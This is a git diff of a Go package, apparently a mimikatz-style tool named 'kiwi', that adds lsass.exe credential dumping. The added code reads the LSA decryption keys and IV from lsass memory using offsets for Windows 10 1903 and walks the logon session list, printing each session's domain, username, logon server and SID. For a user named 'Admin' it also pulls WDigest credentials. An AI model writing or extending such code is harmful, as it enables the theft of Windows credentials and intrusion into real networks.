@@ -3,6 +3,7 @@
 package kiwi
 
 import (
+	"fmt"
 	"sync"
 
 	"github.com/pkg/errors"
@@ -36,9 +37,15 @@ type Kiwi struct {
 	modules    []*basicModuleInfo
 	modulesRWM sync.RWMutex
 
+	// about decrypt
+	iv []byte
+
 	// address about logon session
 	logonSessionListAddr      uintptr
 	logonSessionListCountAddr uintptr
+
+	wdigestPrimaryOffset int
+	wdigestCredAddr      uintptr
 
 	// lock above fields
 	mu sync.Mutex
@@ -99,9 +106,26 @@ func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
 	}
 	defer api.CloseHandle(pHandle)
 	kiwi.logf(logger.Info, "process handle of lsass.exe is 0x%X", pHandle)
-	patch := lsaSrvX64References[buildWin10v1903]
-	kiwi.getLogonSessionList(pHandle, patch)
 
-	// _ = kiwi.searchMemory(pHandle, module.address, module.size)
+	kiwi.requireNT6LSAKeys(pHandle)
+
+	patch := lsaSrvX64References[buildWin10v1903]
+	sessions, err := kiwi.getLogonSessionList(pHandle, patch)
+	if err != nil {
+		return nil, err
+	}
+
+	for _, session := range sessions {
+		fmt.Println("Domain:", session.Domain)
+		fmt.Println("Username:", session.Username)
+		fmt.Println("Logon server:", session.LogonServer)
+		fmt.Println("SID:", session.SID)
+		fmt.Println()
+		if session.Username == "Admin" {
+			kiwi.getWdigestList(pHandle, session.LogonID)
+		}
+
+	}
+
 	return nil, nil
 }
